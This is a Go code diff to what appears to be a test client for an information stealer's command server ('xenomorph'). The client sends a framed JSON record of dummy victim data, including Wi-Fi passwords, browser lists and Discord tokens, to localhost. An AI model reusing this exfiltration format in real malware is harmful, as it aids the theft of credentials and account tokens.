@@ -1,8 +1,11 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/json"
 	"net"
+
+	"github.com/codevault-llc/xenomorph/internal/common"
 )
 
 type ConnectionData struct {
@@ -26,19 +29,17 @@ type ConnectionData struct {
 
 	Wifi string `json:"wifi"`
 
-	WebBrowsers    string `json:"web_browsers"`
-	discord_tokens string `json:"discord_tokens"`
+	WebBrowsers   string `json:"web_browsers"`
+	DiscordTokens string `json:"discord_tokens"`
 }
 
 func main() {
-	// Connect to the server using socket
 	conn, err := net.Dial("tcp", "localhost:8080")
 	if err != nil {
 		panic(err)
 	}
 	defer conn.Close()
 
-	// Turn this into a JSON stringified object
 	testJson := ConnectionData{
 		ComputerName:    "TestComputer",
 		ComputerOS:      "Windows",
@@ -57,14 +58,44 @@ func main() {
 		Disks:           "C: 100GB, D: 200GB",
 		Wifi:            "SSID: TestWifi, Password: TestPassword",
 		WebBrowsers:     "Chrome, Firefox",
-		discord_tokens:  "token1, token2",
+		DiscordTokens:   "token1, token2",
 	}
 
-	// Send the JSON stringified object to the server
 	jsonData, err := json.Marshal(testJson)
 	if err != nil {
 		panic(err)
 	}
 
-	conn.Write(jsonData)
+	headerData := &common.Header{
+		Type:      "JSON",
+		TotalSize: len(jsonData),
+	}
+
+	headerJson, err := json.Marshal(headerData)
+	if err != nil {
+		panic(err)
+	}
+
+	rawJsonData := json.RawMessage(jsonData)
+	message := &common.Message{
+		Type:     common.MessageTypeConnection,
+		JsonData: &rawJsonData,
+	}
+
+	headerSize := uint32(len(headerJson))
+	headerSizeBuf := make([]byte, 4)
+	binary.BigEndian.PutUint32(headerSizeBuf, headerSize)
+	if _, err := conn.Write(headerSizeBuf); err != nil {
+		panic(err)
+	}
+
+	conn.Write(headerJson)
+
+	messageJson, err := json.Marshal(message)
+	if err != nil {
+		panic(err)
+	}
+
+	conn.Write(messageJson)
+	conn.Write([]byte("END_OF_MESSAGE"))
 }
